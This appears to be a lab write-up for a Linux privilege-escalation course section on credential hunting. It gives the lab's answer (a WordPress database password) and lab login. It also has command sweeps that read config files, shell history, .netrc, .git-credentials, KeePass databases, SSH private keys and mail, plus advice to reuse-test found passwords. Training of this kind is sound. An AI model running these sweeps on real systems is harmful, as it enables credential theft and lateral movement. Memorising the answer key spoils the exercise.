# Section 4 — Credential Hunting

> Lab: `ACADEMY-LPE-NIX02` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — WordPress database password | **`W0rdpr3ss_sekur1ty!`** |

From `/var/www/html/wp-config.php` (`DB_USER=wordpressuser`, `DB_NAME=wordpress`, `DB_HOST=localhost`).

---

## Where creds hide (and how to pull them)

### 1 — Web roots / app configs (the #1 source)
```bash
# WordPress (this box):
find / -name 'wp-config.php' 2>/dev/null -exec grep -E 'DB_USER|DB_PASSWORD|DB_NAME|DB_HOST' {} \;
# generic web-root config sweep:
ls -la /var/www /var/www/html /srv 2>/dev/null
grep -rniE 'db_pass|db_user|password|passwd|secret|api[_-]?key|token|connectionstring' \
  /var/www /srv /opt /etc 2>/dev/null | grep -vi 'binary file' | head -40
```
> `/var` holds the web root → app configs with **DB connection strings**. WordPress `wp-config.php` (`DB_PASSWORD`), Laravel `.env`, Joomla `configuration.php` (`$password`), `web.config`, `settings.py`, `database.yml`. Reuse-test every password found (`su`, SSH, DB, other users — password reuse is rampant).

### 2 — Config files anywhere (read-only still readable)
```bash
find / ! -path '*/proc/*' -type f \( -iname '*config*' -o -name '*.conf' -o -name '*.cnf' \
   -o -name '*.ini' -o -name '*.xml' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' \) 2>/dev/null \
   | grep -vE '/(sys|snap|usr/share|usr/lib)/'
```
> World-readable `*.conf` leaks creds even when its directory is closed to you. `.cnf` (MySQL client), `.pgpass`, `.my.cnf`, `.netrc`, `.git-credentials` are gold.

### 3 — Scripts, history, backups, DB files, text
```bash
find / -name '*.sh' 2>/dev/null | grep -vE 'src|snap|share'         # hardcoded creds in admin scripts
find / -name '.bash_history' -readable -exec cat {} \; 2>/dev/null  # passwords-as-args, ssh, mysql -p
find / -type f \( -name '*.bak' -o -name '*.old' -o -name '*~' -o -name '*.save' \) 2>/dev/null
find / -type f \( -name '*.kdbx' -o -name '*.db' -o -name '*.sqlite*' \) 2>/dev/null   # password DBs
grep -rniE 'password|passwd|pwd' /home /tmp /var/tmp 2>/dev/null | grep -vi binary | head
```
> `.bak/.old/~` backups frequently keep secrets stripped from the live file. `.kdbx` = KeePass (crack with `keepass2john`). MySQL/SQLite `.db` files may store app creds/hashes.

### 4 — SSH keys + known_hosts (lateral movement)
```bash
find / \( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name 'authorized_keys' \) -readable 2>/dev/null
ls -la ~/.ssh; cat ~/.ssh/known_hosts 2>/dev/null
find /home -name known_hosts -exec cat {} \; 2>/dev/null
```
> A readable private key for a more-privileged user → `ssh -i key user@localhost` = instant escalation. `known_hosts` lists boxes that key likely also opens → pivot targets. Cross-ref with `arp -a` (§3).

### 5 — Mail / spool
```bash
ls -la /var/mail /var/spool/mail 2>/dev/null; cat /var/mail/$(whoami) 2>/dev/null
```
> Onboarding/reset mails sometimes contain plaintext passwords (same pattern as the osTicket lesson).

---

## Exam / Engagement Notes

- **`/var/www/.../wp-config.php` → `grep DB_PASSWORD`** is the canonical WordPress-cred answer; one `find ... -exec grep` does it.
- Memorise per-app config file → cred key: WP `wp-config.php`/`DB_PASSWORD` · Joomla `configuration.php`/`$password` · Laravel `.env`/`DB_PASSWORD` · Django `settings.py` · Rails `database.yml`.
- **Every credential found = reuse-test immediately** (`su <user>`, `ssh`, DB login, other hosts). Reuse is the most common real escalation.
- Don't skip `.bak/.old/~`, `.bash_history`, `.my.cnf`/`.pgpass`/`.netrc`/`.git-credentials`, `.kdbx`.
- Readable SSH private key for a privileged user → direct win; check `known_hosts` for lateral targets.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (Academy_LLPE!)
2. find / -name wp-config.php 2>/dev/null            -> /var/www/html/wp-config.php
3. grep -E 'DB_USER|DB_PASSWORD' /var/www/html/wp-config.php
   -> DB_PASSWORD = W0rdpr3ss_sekur1ty!              ✅
```

> One line: web root → app config → DB password. `find -name wp-config.php -exec grep DB_PASSWORD` is the whole task; then reuse-test that password everywhere.
